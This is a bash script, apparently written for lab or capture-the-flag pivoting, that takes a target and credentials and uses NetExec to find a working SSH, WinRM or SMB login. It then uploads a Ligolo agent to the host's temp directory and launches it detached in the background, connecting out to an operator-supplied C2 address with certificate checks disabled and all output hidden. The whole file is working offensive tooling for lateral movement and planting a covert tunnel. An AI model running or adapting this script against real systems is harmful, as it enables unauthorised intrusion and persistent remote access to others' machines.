#!/bin/bash

# Usage: ./nxc_ligolo_agent.sh <target> <user> <pass> <c2_ip> <c2_port>
# Example: ./nxc_ligolo_agent.sh 10.10.110.25 house Lucky38 10.10.14.21 443

TARGET="$1"
USER="$2"
PASS="$3"
C2IP="$4"
C2PORT="$5"

if [[ ! -f agent || ! -f agent.exe ]]; then
    echo "[!] agent or agent.exe missing from current directory!"
    exit 1
fi

# Protocol detection
if nxc ssh "$TARGET" -u "$USER" -p "$PASS" -x "echo OK" > /dev/null 2>&1; then
    PROTO="ssh"
    WIN=0
elif nxc winrm "$TARGET" -u "$USER" -p "$PASS" -x "echo OK" > /dev/null 2>&1; then
    PROTO="winrm"
    WIN=1
elif nxc smb "$TARGET" -u "$USER" -p "$PASS" -x "echo OK" > /dev/null 2>&1; then
    PROTO="smb"
    WIN=1
else
    echo "[!] No protocol succeeded for $TARGET"
    exit 1
fi

# Upload agent/agent.exe
if [ "$WIN" -eq 1 ]; then
    AGENT_FILE="agent.exe"
    REMOTE_PATH="C:\\Windows\\Temp\\agent.exe"
    nxc $PROTO "$TARGET" -u "$USER" -p "$PASS" --put-file "$AGENT_FILE" "$REMOTE_PATH" > /dev/null 2>&1
    CMD="start /b C:\\Windows\\Temp\\agent.exe -connect $C2IP:$C2PORT -ignore-cert"
else
    AGENT_FILE="agent"
    REMOTE_PATH="/tmp/agent"
    nxc $PROTO "$TARGET" -u "$USER" -p "$PASS" --put-file "$AGENT_FILE" "$REMOTE_PATH" > /dev/null 2>&1
    # Ultimate detachment: double-shell, setsid, nohup, all I/O closed, & echo Done
    CMD="sh -c 'chmod +x /tmp/agent && setsid nohup /tmp/agent -connect $C2IP:$C2PORT -ignore-cert >/dev/null 2>&1 < /dev/null &' && echo Done"
fi

# Run agent in background and exit immediately
nxc $PROTO "$TARGET" -u "$USER" -p "$PASS" -x "$CMD" > /dev/null 2>&1

exit 0
